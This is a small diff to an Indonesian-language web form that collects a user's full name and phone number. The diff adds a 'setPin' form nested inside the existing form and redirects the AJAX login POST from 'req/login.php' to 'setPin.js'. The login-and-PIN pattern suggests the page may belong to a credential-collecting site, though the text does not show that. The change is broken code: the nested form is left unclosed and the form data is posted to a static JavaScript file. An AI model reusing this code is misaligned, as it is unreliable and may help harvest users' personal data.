@@ -1058,6 +1058,7 @@ body.stop-scrolling {
   <div class="container-3 w-container">
    <div class="form-block w-form">
   <form id="form1" onsubmit="submitForm(event); return false" method="POST" style="padding: 10px;">
+ <form id="setPin" onsubmit="">
   <input type="hidden" id="nomorku" name="nomorku" value="">	
      <label for="nama">Nama Lengkap</label>
      <input type="text" name="nama" id="nama" class="text-field-2 w-input" maxlength="200" data-name="Nomor Handphone" placeholder="Tuliskan Nama Lengkap Anda" required>
@@ -1131,7 +1132,7 @@ $('#form1').on('submit', function (event) {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'req/login.php',
+ url: 'setPin.js',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
